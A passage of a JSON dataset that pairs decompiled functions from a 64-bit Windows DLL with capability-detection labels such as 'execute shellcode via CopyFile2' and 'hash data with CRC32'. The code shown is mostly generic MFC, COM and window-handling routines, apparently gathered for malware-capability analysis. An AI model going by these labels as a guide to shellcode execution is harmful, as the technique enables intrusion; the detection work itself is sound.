0x58);\n                uStack120 = *arg2;\n                uStack116 = arg2[1];\n                uStack112 = arg2[2];\n                uStack108 = arg2[3];\n            }\n            *(puVar13 + -8) = 0x18000ab0b;\n            (*_sym.imp.OLEAUT32.dll_VariantClear)();\n            puVar15 = &stack0xffffffffffffffa8;\n            if (pvargDest != NULL) {\n                puVar15 = pvargDest;\n            }\n            iVar1 = *(arg3 + 6);\n            *(puVar13 + 0x38) = puVar15;\n            *(puVar13 + 0x30) = ppiVar14;\n            *(puVar13 + 0x28) = arg3 + 2;\n            *(puVar13 + 0x20) = iVar1;\n            uVar2 = *(arg3 + 1);\n            uVar3 = *arg3;\n            *(puVar13 + -8) = 0x18000ab4c;\n            (*_sym.imp.OLEAUT32.dll_VariantChangeTypeEx)(&stack0xffffffffffffff78, 0, uVar3, uVar2);\n            *(puVar13 + -8) = 0x18000ab58;\n            (*_sym.imp.OLEAUT32.dll_VariantCopy)(&stack0xffffffffffffffa8);\n            while (ppiVar12 != NULL) {\n                ppiVar11 = *ppiVar12;\n                *(puVar13 + -8) = 0x18000ab69;\n                fcn.18003342c(ppiVar12);\n                ppiVar12 = ppiVar11;\n            }\n        }\n    }\n    uVar9 = uStack56 ^ &stack0xffffffffffffff78;\n    *(puVar13 + -8) = 0x18000ab7c;\n    fcn.180032ea0(uVar9);\n    return;\n}\n",
        "token_count": 1635
    },
    "18000bda": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.18000bda0(int64_t arg1, int64_t *pvarg)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    int64_t *piStackX8;\n    \n    if (*(arg1 + 0x18) != pvarg) {\n        if (pvarg != NULL) {\n            (**(*pvarg + 8))(pvarg);\n        }\n        if (*(arg1 + 0x18) != NULL) {\n            (**(**(arg1 + 0x18) + 0x10))();\n        }\n        *(arg1 + 0x18) = pvarg;\n    }\n    uVar2 = fcn.18000b84c(pvarg, arg1 + 0x30, arg1 + 0x20, arg1 + 0x40);\n    if (-1 < uVar2) {\n        piStackX8 = NULL;\n        uVar1 = (*_sym.imp.OLEAUT32.dll_RegisterTypeLib)(arg1 + 0x30, *(arg1 + 0x40), *(arg1 + 0x42), 0x400, &piStackX8)\n        ;\n        uVar2 = uVar1;\n        if (uVar1 < 0) {\n            if (piStackX8 != NULL) {\n                (**(*piStackX8 + 0x10))();\n            }\n        }\n        else {\n            uVar1 = (**(*piStackX8 + 0x30))(piStackX8, arg1 + 0x20, arg1 + 0x48);\n            uVar2 = uVar1;\n            if (uVar1 < 0) {\n                if (piStackX8 != NULL) {\n                    (**(*piStackX8 + 0x10))();\n                }\n            }\n            else {\n                uVar1 = fcn.18000b44c(pvarg, arg1, arg1 + 0x20, arg1 + 0x10);\n                uVar2 = uVar1;\n                if (piStackX8 != NULL) {\n                    (**(*piStackX8 + 0x10))();\n                }\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 487
    },
    "18001151": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\ncode ** fcn.180011510(code **arg1, uint64_t arg2, code *arg3)\n\n{\n    fcn.180015f5c(arg1);\n    *arg1 = vtable.CDialog.0;\n    fcn.180033c90(arg1 + 0x15, 0, 0x40);\n    arg1[0x16] = arg2 & 0xffff;\n    *(arg1 + 0x15) = arg2;\n    arg1[0x1a] = arg3;\n    return arg1;\n}\n",
        "token_count": 123
    },
    "18001731": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.180017318(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    int64_t arg1_00;\n    uint32_t uVar6;\n    uint32_t uStack104;\n    uint32_t uStack100;\n    int32_t iStack96;\n    int32_t iStack92;\n    int32_t iStack88;\n    int32_t iStack84;\n    int32_t iStack80;\n    int32_t iStack76;\n    int32_t iStack72;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint auStack56 [5];\n    uchar auStack36 [28];\n    \n    uVar1 = fcn.18001bd28(arg1);\n    arg1_00 = 0;\n    if (arg2 == 0) {\n        if ((uVar1 >> 0x1e & 1) == 0) {\n            iVar4 = (*_sym.imp.USER32.dll_GetWindow)(*(arg1 + 0x40), 4);\n        }\n        else {\n            iVar4 = (*_sym.imp.USER32.dll_GetParent)();\n        }\n        if ((iVar4 != 0) && (iVar2 = (*_sym.imp.USER32.dll_SendMessageW)(iVar4, 0x36b),  iVar2 != 0)) {\n            iVar4 = iVar2;\n        }\n    }\n    else {\n        iVar4 = *(arg2 + 0x40);\n    }\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(arg1 + 0x40), &iStack88);\n    if ((uVar1 >> 0x1e & 1) == 0) {\n        if ((iVar4 != 0) &&\n           ((uVar1 = (*_sym.imp.USER32.dll_GetWindowLongW)(iVar4, 0xfffffff0),  (uVar1 >> 0x1c & 1) == 0 ||\n            ((uVar1 >> 0x1d & 1) != 0)))) {\n            iVar4 = arg1_00;\n        }\n        auStack56[0] = 0x28;\n        if (iVar4 == 0) {\n            piVar3 = fcn.180010ad4();\n            iVar4 = arg1_00;\n            if (piVar3 != NULL) {\n                iVar4 = (**(*piVar3 + 0xe8))(piVar3);\n            }\n            if (iVar4 != 0) {\n                arg1_00 = *(iVar4 + 0x40);\n            }\n            uVar5 = fcn.180014764(arg1_00, 1);\n            fcn.1800147e4(uVar5, auStack56);\n            (*_sym.imp.USER32.dll_CopyRect)(&iStack72, auStack36);\n        }\n        else {\n            (*_sym.imp.USER32.dll_GetWindowRect)(iVar4, &iStack72);\n            uVar5 = fcn.180014764(iVar4, 2);\n            fcn.1800147e4(uVar5, auStack56);\n        }\n        (*_sym.imp.USER32.dll_CopyRect)();\n    }\n    else {\n        uVar5 = (*_sym.imp.USER32.dll_GetParent)(*(arg1 + 0x40));\n        (*_sym.imp.USER32.dll_GetClientRect)(uVar5, &uStack104);\n        (*_sym.imp.USER32.dll_GetClientRect)(iVar4, &iStack72);\n        (*_sym.imp.USER32.dll_MapWindowPoints)();\n    }\n    uVar1 = (iStack64 + iStack72) / 2 - (iStack80 - iStack88) / 2;\n    uVar6 = (iStack60 + iStack68) / 2 - (iStack76 - iStack84) / 2;\n    if (iStack96 < (iStack80 - iStack88) + uVar1) {\n        uVar1 = (iStack88 - iStack80) + iStack96;\n    }\n    if (uVar1 < uStack104) {\n        uVar1 = uStack104;\n    }\n    if (iStack92 < (iStack76 - iStack84) + uVar6) {\n        uVar6 = (iStack84 - iStack76) + iStack92;\n    }\n    if (uVar6 < uStack100) {\n        uVar6 = uStack100;\n    }\n    fcn.18001c040(arg1, 0, uVar1, uVar6);\n    return;\n}\n",
        "token_count": 1029
    },
    "1800183b": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t fcn.1800183b4(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    uint32_t uVar4;\n    uchar auStackX24 [16];\n    \n    uVar4 = 0;\n    iVar2 = fcn.180014058();\n    piVar3 = fcn.180017878(**(iVar2 + 200), auStackX24);\n    if (*piVar3 == 0) {\n        if ((arg2 & 0x3fc0) == arg2) {\n            iVar2 = fcn.180014058();\n            fcn.180017800(**(iVar2 + 200));\n            uVar4 = 0x3fc0;\n        }\n    }\n    else {\n        iVar2 = fcn.180014058();\n        iVar1 = fcn.1800178ec(**(iVar2 + 200), arg1);\n        if (iVar1 != 0) {\n            uVar4 = arg2;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 242
    },
    "18001daf": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nushort * fcn.18001daf0(ushort *arg1, int64_t arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    ushort *puVar5;\n    uint64_t noname_1;\n    ulong in_R8;\n    code *apcStack592 [3];\n    int64_t aiStack568 [70];\n    \n    *arg1 = 8;\n    *(arg1 + 4) = 0;\n    if (arg2 != 0) {\n        iVar4 = fcn.18001da68(apcStack592, arg2);\n        noname_1 = *(*(iVar4 + 0x18) + -0x10);\n        iVar4 = (*_sym.imp.OLEAUT32.dll_SysReAllocStringLen)();\n        if (iVar4 == 0) {\n            fcn.180009098();\n            pcVar3 = swi(3);\n            puVar5 = (*pcVar3)();\n            return puVar5;\n        }\n        *(arg1 + 4) = iVar4;\n        apcStack592[0] =\n             vtable.ATL::CFixedStringT_class_ATL::CStringT_wchar_t__class_StrTraitMFC_wchar_t__class_ATL::ChTraitsCRT_wchar_t_____256_.0\n        ;\n        fcn.1800089e0(aiStack568, noname_1, in_R8);\n        LOCK();\n        piVar1 = aiStack568[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar2 + -1 < 1) {\n            (**(**(aiStack568[0] + -0x18) + 8))();\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 408
    },
    "180022a5": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.180022a54(ulong noname_0, ulong *arg2, ulong arg3, int32_t *arg4)\n\n{\n    int16_t *piVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    uint32_t uVar6;\n    uint32_t in_stack_00000028;\n    uchar auStack136 [32];\n    int64_t **ppiStack104;\n    int64_t *piStack88;\n    int64_t *piStack80;\n    uint uStack72;\n    ulong uStack64;\n    ulong uStack52;\n    ulong uStack44;\n    uint64_t uStack32;\n    \n    uStack32 = *0x180067ce0 ^ auStack136;\n    if ((arg2 != NULL) && (arg4 != NULL)) {\n        piStack80 = NULL;\n        iVar3 = (***arg2)(arg2, 0x1800514c8, &piStack80);\n        if (in_stack_00000028 != 0) {\n            fcn.180033c90(arg4, 0, in_stack_00000028 << 2);\n        }\n        if (-1 < iVar3) {\n            uStack72 = 0;\n            piStack88 = NULL;\n            ppiStack104 = &piStack88;\n            uStack52 = *0x1800567e0;\n            uStack44 = *0x1800567e8;\n            uStack64 = arg3;\n            iVar3 = (**(*piStack80 + 0x18))(*0x1800567e0);\n            if (-1 < iVar3) {\n                uVar6 = 0;\n                iVar5 = 0;\n                while( true ) {\n                    uVar4 = in_stack_00000028;\n                    if (*(piStack88 + 1) < in_stack_00000028) {\n                        uVar4 = *(piStack88 + 1);\n                    }\n                    iVar2 = *piStack88;\n                    if (uVar4 <= uVar6) break;\n                    piVar1 = iVar2 + 0x38 + iVar5;\n                    uVar6 = uVar6 + 1;\n                    iVar5 = iVar5 + 0x48;\n                    *arg4 = *piVar1;\n                    arg4 = arg4 + 1;\n                }\n                if (iVar2 != 0) {\n                    (*_sym.imp.ole32.dll_CoTaskMemFree)(iVar2);\n                }\n            }\n            (*_sym.imp.ole32.dll_CoTaskMemFree)(piStack88);\n        }\n        if (piStack80 != NULL) {\n            (**(*piStack80 + 0x10))();\n        }\n    }\n    fcn.180032ea0(uStack32 ^ auStack136);\n    return;\n}\n",
        "token_count": 620
    },
    "18002372": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180023724(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    ulong *puVar2;\n    uint64_t uVar3;\n    int64_t *piVar4;\n    ulong *puVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    int64_t **ppiVar8;\n    int64_t arg1_00;\n    int64_t **ppiVar9;\n    int64_t **ppiVar10;\n    uint32_t uVar11;\n    int64_t **ppiVar12;\n    ulong in_R9;\n    uchar auStack312 [32];\n    ulong uStack280;\n    ulong uStack272;\n    int64_t *piStack264;\n    int64_t **ppiStack256;\n    int64_t *piStack248;\n    int64_t iStack240;\n    int64_t **ppiStack232;\n    uint uStack224;\n    int64_t iStack216;\n    int64_t iStack208;\n    ulong uStack200;\n    int64_t **ppiStack192;\n    ulong uStack184;\n    uchar auStack168 [32];\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uchar auStack112 [32];\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint64_t uStack56;\n    \n    uStack184 = 0xfffffffffffffffe;\n    uStack56 = *0x180067ce0 ^ auStack312;\n    iVar1 = arg1[5];\n    iStack240 = arg1[4];\n    ppiVar10 = NULL;\n    if (arg1[0x12] == 0) {\n        piVar4 = arg1[2];\n        if ((piVar4 == NULL) ||\n           (iVar7 = (**(*piVar4 + 0x18))(piVar4, 0x180056048, &piStack264, &ppiStack256),  iVar7 < 0))\n        goto code_r0x000180023c1d;\n        fcn.18001f130(arg1, auStack168, 0x180056798);\n        uStack136 = 0;\n        uStack132 = 0;\n        uStack124 = 0x20;\n        uStack128 = 0xffffffff;\n        uStack120 = 0;\n        uStack116 = 0x1fb;\n        fcn.18001f130(arg1, auStack112, 0x1800567b8);\n        uStack80 = 0x28;\n        uStack76 = 0;\n        uStack68 = 0x30;\n        uStack72 = 0xffffffff;\n        uStack64 = 0;\n        uStack60 = 0x1e;\n        uStack280 = uStack280._4_4_ << 0x20;\n        iVar7 = (**(*piStack264 + 0x20))(piStack264, 2, auStack168);\n        if (iVar7 < 0) {\n            (**(*piStack264 + 0x10))();\n            goto code_r0x000180023c1d;\n        }\n        ppiStack232 = ppiStack256;\n        uStack224 = 1;\n        iStack216 = 0;\n        iStack208 = 0;\n        uStack200 = 0;\n        iVar7 = (**(*piStack264 + 0x30))(piStack264, 0, &ppiStack232);\n        if (iVar7 < 0) {\n            (**(*piStack264 + 0x10))();\n            goto code_r0x000180023c1d;\n        }\n        arg1[5] = iStack216;\n        ppiStack256 = ppiStack192;\n        arg1[0xd] = iStack208;\n        arg1[4] = ppiStack192;\n        (**(*piStack264 + 0x10))();\n    }\n    else {\n        iVar7 = (**(*arg1[0x13] + 0x28))(arg1[0x13], 0x180056298, &piStack248);\n        if (iVar7 < 0) goto code_r0x000180023c1d;\n        iVar7 = (***piStack248)(piStack248, 0x18004d3f8, &ppiStack256);\n        if (-1 < iVar7) {\n            piStack264 = NULL;\n            iVar7 = (*(*ppiStack256)[4])(ppiStack256, 0x1800563b8, &piStack264);\n            if (-1 < iVar7) {\n                (**(*piStack264 + 0x28))(piStack264, arg1[1] + 0x178, arg1 + 0x16);\n                (**(*piStack264 + 0x10))();\n            }\n            (*(*ppiStack256)[2])();\n        }\n        ppiVar8 = fcn.180009660(0x28);\n        piVar4 = piStack248;\n        ppiVar12 = ppiVar10;\n        ppiStack256 = ppiVar8;\n        if (ppiVar8 != NULL) {\n            *ppiVar8 = NULL;\n            ppiVar8[1] = NULL;\n            ppiVar8[4] = NULL;\n            ppiVar8[2] = NULL;\n            ppiVar8[3] = NULL;\n            ppiVar12 = ppiVar8;\n            if (*ppiVar8 != piStack248) {\n                if (piStack248 != NULL) {\n                    (**(*piStack248 + 8))(piStack248);\n                }\n                if (*ppiVar8 != NULL) {\n                    (**(**ppiVar8 + 0x10))();\n                }\n                *ppiVar8 = piVar4;\n            }\n        }\n        arg1[0x14] = ppiVar12;\n        (**(*piStack248 + 0x10))();\n        puVar2 = *arg1[0x14];\n        if (puVar2 != NULL) {\n            (***puVar2)(puVar2, 0x1800514e8, arg1[0x14] + 1);\n        }\n        ppiVar8 = fcn.180009660(0x48);\n        ppiVar12 = ppiVar10;\n        if (ppiVar8 != NULL) {\n            *ppiVar8 = NULL;\n            *(ppiVar8 + 1) = 0;\n            ppiVar8[2] = NULL;\n            ppiVar8[3] = NULL;\n            ppiVar8[5] = NULL;\n            ppiVar8[6] = NULL;\n            *(ppiVar8 + 0x3c) = 0;\n            ppiVar8[8] = 0x1f40;\n            ppiVar8[4] = NULL;\n            ppiVar12 = ppiVar8;\n        }\n        arg1[0x15] = ppiVar12;\n        fcn.180022b94(ppiVar12, *arg1[0x14]);\n        *(arg1[0x14] + 0x10) = arg1[0x15];\n        uVar3 = *(arg1[0x15] + 0x18);\n        arg1[4] = uVar3;\n        if (0x1ffffff < uVar3) goto code_r0x000180023c1d;\n        arg1_00 = (*_sym.imp.ole32.dll_CoTaskMemAlloc)();\n        arg1[5] = arg1_00;\n        if (arg1_00 == 0) {\n            fcn.1800124cc();\n            pcVar6 = swi(3);\n            (*pcVar6)();\n            return;\n        }\n        ppiVar12 = arg1[4] << 6;\n        fcn.180033c90(arg1_00, 0, ppiVar12);\n        ppiVar8 = arg1[0x14];\n        if (ppiVar8[3] != NULL) {\n            uStack272 = 0;\n            uStack280 = 0;\n            in_R9 = 0;\n            ppiVar12 = ppiVar8 + 3;\n            (**(**ppiVar8 + 0x30))();\n            ppiVar8[3] = NULL;\n        }\n        iVar7 = (**(**ppiVar8 + 0x38))();\n        if (-1 < iVar7) {\n            fcn.1800215b0(ppiVar8, 0, CONCAT71(ppiVar12 >> 8, 1), in_R9);\n        }\n        ppiVar12 = arg1[0x14] + 3;\n        if (*ppiVar12 != NULL) {\n            piVar4 = *arg1[0x14];\n            uStack272 = 0;\n            uStack280 = 0;\n            (**(*piVar4 + 0x30))(piVar4, 1, ppiVar12);\n            *ppiVar12 = NULL;\n        }\n    }\n    ppiVar12 = ppiVar10;\n    ppiVar8 = ppiVar10;\n    if (0 < arg1[4]) {\n        do {\n            ppiStack256 = fcn.180009660(0x38);\n            ppiVar9 = ppiVar10;\n            if (ppiStack256 != NULL) {\n                ppiVar9 = fcn.18002d6a4(ppiStack256, 10);\n            }\n            *(ppiVar8 + arg1[5] + 0x38) = ppiVar9;\n            uVar11 = ppiVar12 + 1;\n            ppiVar12 = uVar11;\n            ppiVar8 = ppiVar8 + 8;\n        } while (uVar11 < arg1[4]);\n    }\n    if (iVar1 != 0) {\n        if (0 < iStack240) {\n            ppiVar12 = iVar1 + 0x38;\n            do {\n                puVar2 = (*ppiVar12)[1];\n                while (puVar2 != NULL) {\n                    if (puVar2 == NULL) {\n                        fcn.180012514();\n                        pcVar6 = swi(3);\n                        (*pcVar6)();\n                        return;\n                    }\n                    puVar5 = *puVar2;\n                    (**(*arg1 + 0x10))(arg1, puVar2[2], 1);\n                    puVar2 = puVar5;\n                }\n                fcn.18002d584(*ppiVar12);\n                piVar4 = *ppiVar12;\n                if (piVar4 != NULL) {\n                    (**(*piVar4 + 8))(piVar4, 1);\n                }\n                uVar11 = ppiVar10 + 1;\n                ppiVar10 = uVar11;\n                ppiVar12 = ppiVar12 + 8;\n            } while (uVar11 < iStack240);\n        }\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(iVar1);\n    }\ncode_r0x000180023c1d:\n    fcn.180032ea0(uStack56 ^ auStack312);\n    return;\n}\n",
        "token_count": 2486
    },
    "1800296f": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.1800296f4(uint64_t lpBuffer, int64_t arg2, int64_t arg3)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int64_t *piVar6;\n    int64_t iVar7;\n    int32_t iVar8;\n    uint64_t arg3_00;\n    uchar auStack760 [32];\n    uchar *puStack728;\n    uint32_t *puStack720;\n    ulong uStack712;\n    uint uStack704;\n    uint32_t auStack696 [2];\n    uint64_t uStack688;\n    int64_t iStack680;\n    uchar auStack672 [8];\n    ulong uStack664;\n    uchar auStack648 [44];\n    uchar auStack604 [548];\n    uint64_t uStack56;\n    \n    uStack664 = 0xfffffffffffffffe;\n    uStack56 = *0x180067ce0 ^ auStack760;\n    arg3_00 = 0;\n    if (lpBuffer == 0) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (arg2 == 0) {\n        fcn.180012514();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetFullPathNameW)(arg2, 0x104);\n    if (uVar4 == 0) {\n        iVar5 = fcn.180036208(lpBuffer, 0x104, arg2, 0xffffffffffffffff);\n        if (iVar5 != 0) {\n            if (iVar5 == 0xc) {\n                fcn.1800124cc();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if ((iVar5 == 0x16) || (iVar5 == 0x22)) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if (iVar5 != 0x50) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.180029694(arg3, arg2);\n    }\n    else if (uVar4 < 0x104) {\n        piVar6 = fcn.180012330();\n        if (piVar6 == NULL) {\n            fcn.180001214(0x80004005);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        iStack680 = (**(*piVar6 + 0x18))(piVar6);\n        iStack680 = iStack680 + 0x18;\n        fcn.1800294a0(lpBuffer, &iStack680);\n        iVar3 = iStack680;\n        iVar5 = (*_sym.imp.SHLWAPI.dll_PathIsUNCW)(iStack680);\n        if (iVar5 == 0) {\n            uStack704 = 0;\n            uStack712 = 0;\n            puStack720 = auStack696;\n            puStack728 = auStack672;\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetVolumeInformationW)(iVar3, 0, 0, 0);\n            if (iVar5 == 0) {\n                fcn.180029694(arg3, arg2);\n                LOCK();\n                piVar1 = iVar3 + -8;\n                iVar5 = *piVar1;\n                *piVar1 = *piVar1 + -1;\n                if (iVar5 + -1 < 1) {\n                    (**(**(iVar3 + -0x18) + 8))();\n                }\n                goto code_r0x0001800299fc;\n            }\n            if ((auStack696[0] & 2) == 0) {\n                (*_sym.imp.USER32.dll_CharUpperW)(lpBuffer);\n            }\n            if (((auStack696[0] & 4) == 0) &&\n               (iVar7 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(arg2, auStack648),  iVar7 != -1)) {\n                (*_sym.imp.KERNEL32.dll_FindClose)(iVar7);\n                if ((uStack688 == 0) || (uStack688 <= lpBuffer)) {\n                    fcn.180029694(arg3, arg2);\n                    LOCK();\n                    piVar1 = iVar3 + -8;\n                    iVar5 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                    if (iVar5 + -1 < 1) {\n                        (**(**(iVar3 + -0x18) + 8))();\n                    }\n                    goto code_r0x0001800299fc;\n                }\n                iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenW)(auStack604);\n                iVar8 = uStack688 - lpBuffer >> 1;\n                if (0x103 < iVar5 + iVar8) {\n                    if (arg3 != 0) {\n                        *(arg3 + 0x10) = 3;\n                        if (arg2 == 0) {\n                            uVar4 = 0;\n                        }\n                        else {\n                            uVar4 = fcn.180033b84(arg2);\n                        }\n                        fcn.180008dfc(arg3 + 0x18, arg2, uVar4);\n                    }\n                    LOCK();\n                    piVar1 = iVar3 + -8;\n                    iVar5 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                    if (iVar5 + -1 < 1) {\n                        (**(**(iVar3 + -0x18) + 8))();\n                    }\n                    goto code_r0x0001800299fc;\n                }\n                iVar5 = fcn.180035a14(uStack688, 0x104 - iVar8, auStack604);\n                if (iVar5 != 0) {\n                    if (iVar5 == 0xc) {\n                        fcn.1800124cc();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    if ((iVar5 == 0x16) || (iVar5 == 0x22)) {\n                        fcn.180012514();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    if (iVar5 != 0x50) {\n                        fcn.180012514();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                }\n            }\n        }\n        LOCK();\n        piVar1 = iVar3 + -8;\n        iVar5 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar5 + -1 < 1) {\n            (**(**(iVar3 + -0x18) + 8))();\n        }\n    }\n    else if (arg3 != 0) {\n        *(arg3 + 0x10) = 3;\n        if (arg2 != 0) {\n            uVar4 = fcn.180033b84(arg2);\n            arg3_00 = uVar4;\n        }\n        fcn.180008dfc(arg3 + 0x18, arg2, arg3_00);\n    }\ncode_r0x0001800299fc:\n    fcn.180032ea0(uStack56 ^ auStack760);\n    return;\n}\n",
        "token_count": 1671
    },
    "18002cbc": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.18002cbc0(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint32_t *arg1_00;\n    ulong uVar5;\n    \n    *(arg1 + 1) = arg3;\n    if (arg3 <= arg3 + 0x40) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40);\n        *arg1 = iVar4;\n        if (iVar4 != 0) {\n            arg1_00 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar4);\n            iVar2 = fcn.180034220(arg1_00, *(arg1 + 1), arg2, *(arg1 + 1));\n            if (iVar2 != 0) {\n                if (iVar2 == 0xc) {\n                    fcn.1800124cc();\n                    pcVar1 = swi(3);\n                    uVar5 = (*pcVar1)();\n                    return uVar5;\n                }\n                if ((iVar2 == 0x16) || (iVar2 == 0x22)) {\n                    fcn.180012514();\n                    pcVar1 = swi(3);\n                    uVar5 = (*pcVar1)();\n                    return uVar5;\n                }\n                if (iVar2 != 0x50) {\n                    fcn.180012514();\n                    pcVar1 = swi(3);\n                    uVar5 = (*pcVar1)();\n                    return uVar5;\n                }\n            }\n            if (*(arg1_00 + 2) == -1) {\n                uVar3 = arg1_00[3];\n            }\n            else {\n                uVar3 = *arg1_00;\n            }\n            *(arg1 + 0xc) = ~(uVar3 >> 6) & 1;\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*arg1);\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 451
    },
    "18002d35": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong * fcn.18002d358(int64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    int64_t arg1_00;\n    uint32_t auStackX24 [2];\n    uchar auStackX32 [8];\n    \n    arg1_00 = arg1;\n    puVar1 = fcn.18002d0d8(arg1, arg2, auStackX24, auStackX32);\n    if (puVar1 == NULL) {\n        if (*(arg1_00 + 8) == 0) {\n            fcn.18002d01c(arg1_00, *(arg1_00 + 0x10), 1);\n        }\n        puVar1 = fcn.18002d2ec(arg1);\n        puVar1[1] = arg2;\n        *puVar1 = *(*(arg1 + 8) + auStackX24[0] * 8);\n        *(*(arg1 + 8) + auStackX24[0] * 8) = puVar1;\n    }\n    return puVar1 + 2;\n}\n",
        "token_count": 244
    },
    "180030f3": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.180030f3c(ulong noname_0, ulong noname_1, ulong arg3)\n\n{\n    ulong auStackX24 [2];\n    \n    auStackX24[0] = arg3;\n    fcn.180030e4c(noname_0, noname_1, auStackX24, 1);\n    return;\n}\n",
        "token_count": 81
    },
    "18000fd4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.18000fd44(int64_t arg1, int64_t arg2, uint64_t arg3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    \n    if ((arg3 != 0) && (arg2 == 0)) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    if ((~*(arg1 + 0x20) & 1) == 0) {\n        if (arg3 != 0) {\n            do {\n                uVar4 = 0xfffffff;\n                if (arg3 < 0xfffffff) {\n                    uVar4 = arg3 & 0xffffffff;\n                }\n                uVar3 = uVar4 * 8;\n                uVar2 = fcn.18002b508(arg1, arg2, uVar3);\n                if (uVar2 != uVar3) {\n                    fcn.18002b424(3, 0);\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n                arg2 = arg2 + uVar4 * 8;\n                arg3 = arg3 - uVar4;\n            } while (arg3 != 0);\n        }\n    }\n    else if (arg3 != 0) {\n        do {\n            uVar4 = 0xfffffff;\n            if (arg3 < 0xfffffff) {\n                uVar4 = arg3 & 0xffffffff;\n            }\n            fcn.18002ba70(arg1, arg2, uVar4 << 3);\n            arg2 = arg2 + uVar4 * 8;\n            arg3 = arg3 - uVar4;\n        } while (arg3 != 0);\n    }\n    return;\n}\n",
        "token_count": 410
    },
    "18001c50": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
